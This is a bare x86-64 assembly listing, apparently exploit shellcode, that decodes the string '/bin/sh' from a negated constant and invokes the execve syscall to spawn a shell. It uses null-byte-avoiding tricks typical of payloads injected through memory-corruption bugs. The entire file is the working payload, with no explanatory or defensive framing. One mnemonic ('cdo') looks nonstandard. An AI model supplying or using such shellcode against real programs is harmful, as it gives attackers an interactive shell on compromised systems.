global _start

section .text

_start:
	sub rax, rax
 	cdo
	mov rbx, 0xFF978CD091969DD1
	neg rbx
	push rbx
	push rbx
	mov rdi, rsp
 	push rdx
	push rdi
	mov rsi, rsp
	add al, 0x3b
	syscall
